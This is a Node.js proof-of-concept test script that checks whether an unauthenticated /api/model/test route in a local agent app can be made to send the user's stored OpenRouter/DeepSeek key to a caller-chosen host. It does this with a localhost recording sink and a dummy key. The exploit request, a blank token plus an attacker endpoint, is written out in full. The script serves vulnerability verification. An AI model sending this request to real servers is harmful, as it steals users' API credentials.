// The w-20 build adds POST /api/model/test. It is `.noAuth()` like every other route here, and when
// the caller sends a BLANK token it falls back to the key already stored for that role:
//
//   const token = String(body.token ?? "").trim() || (role === "thinker" ? settings.thinkerToken : settings.token) || "";
//
// The endpoint, meanwhile, is whatever the caller names. Put those together and anyone who can
// reach the port can ask the server to send the user's OpenRouter/DeepSeek key to a host of their
// choosing, with no user action and nothing shown in the UI.
//
// This does not assert that. It points the server at a recording sink and reads what arrives.
//
//   T4_TREE=<tree> node can-anyone-make-the-server-post-the-key-elsewhere.mjs
import http from "node:http";
import { spawn } from "node:child_process";
import { promises as fs } from "node:fs";
import os from "node:os"; import path from "node:path";

const TREE = process.env.T4_TREE || "/var/home/work/gitdir/tina4-simple-agent-work/scratch";
const APP_PORT = Number(process.env.T4_PORT || 8773);
const REAL_PORT = Number(process.env.T4_REAL_PORT || 8971);   // the provider the user configured
const SINK_PORT = Number(process.env.T4_SINK_PORT || 8972);   // "somewhere else"
const KEY = "sk-USERS-REAL-KEY-abcdef";
const HOME = path.join(os.tmpdir(), "w20-ssrf-" + process.pid);

const sinkSaw = [];
const real = http.createServer((req, res) => {
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify({ data: [{ id: "the-model", context_window: 64000 }] }));
});
const sink = http.createServer((req, res) => {
  sinkSaw.push({ url: req.url, auth: req.headers.authorization || "" });
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify({ data: [] }));
});
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
await new Promise((r) => real.listen(REAL_PORT, "127.0.0.1", r));
await new Promise((r) => sink.listen(SINK_PORT, "127.0.0.1", r));
await fs.mkdir(path.join(HOME, "projects", "p"), { recursive: true });

const app = spawn(path.join(TREE, "node_modules/.bin/tsx"), ["app.ts"], {
  cwd: TREE, detached: true, stdio: ["ignore", "ignore", "pipe"],
  env: { HOME, PATH: process.env.PATH, TINA4_HOST: "127.0.0.1", TINA4_AGENT_PORT: String(APP_PORT),
         TINA4_NO_BROWSER: "1", TINA4_PROJECTS_ROOT: path.join(HOME, "projects"),
         TINA4_CURRENT_PROJECT: "p", TINA4_STATE_DIR: path.join(HOME, ".tina4-simple-agent") },
});
app.stderr.on("data", () => {});
let up = false;
for (let i = 0; i < 120 && !up; i++) { try { up = (await fetch(`http://127.0.0.1:${APP_PORT}/api/model`)).ok; } catch {} if (!up) await sleep(500); }

let reply = null, hasTestRoute = false;
if (up) {
  // The user configures their own provider and saves their key, the ordinary way.
  await fetch(`http://127.0.0.1:${APP_PORT}/api/model`, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ coderVendor: "custom", endpoint: `http://127.0.0.1:${REAL_PORT}/v1`, model: "the-model", token: KEY }) });
  await sleep(500);
  sinkSaw.length = 0;
  // Now a caller who is NOT the user names a different endpoint and sends no key at all.
  const r = await fetch(`http://127.0.0.1:${APP_PORT}/api/model/test`, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ role: "coder", endpoint: `http://127.0.0.1:${SINK_PORT}/v1`, model: "", token: "" }) });
  hasTestRoute = r.headers.get("content-type")?.includes("json") ?? false;
  reply = await r.text().catch(() => "");
}
try { process.kill(-app.pid, "SIGTERM"); } catch {}
await sleep(500); real.close(); sink.close();
await fs.rm(HOME, { recursive: true, force: true }).catch(() => {});

console.log(`  tree              ${TREE}`);
console.log(`  app came up       ${up}`);
console.log(`  /api/model/test   ${hasTestRoute ? "exists" : "absent (this build has no such route)"}`);
console.log(`  the sink received ${sinkSaw.length} request(s)`);
for (const h of sinkSaw) console.log(`     ${h.url}   ${h.auth}`);
console.log();
if (!up) { console.log("  UNPROVEN — the app never started"); process.exit(2); }
if (!hasTestRoute) { console.log("  n/a — no /api/model/test on this tree, so there is nothing to exploit"); process.exit(1); }
const leaked = sinkSaw.some((h) => h.auth === `Bearer ${KEY}`);
console.log(leaked
  ? `  REPRODUCED — an unauthenticated caller made the server send the stored key to a host it chose`
  : `  not reproduced — the sink never saw the stored key`);
process.exit(leaked ? 0 : 1);
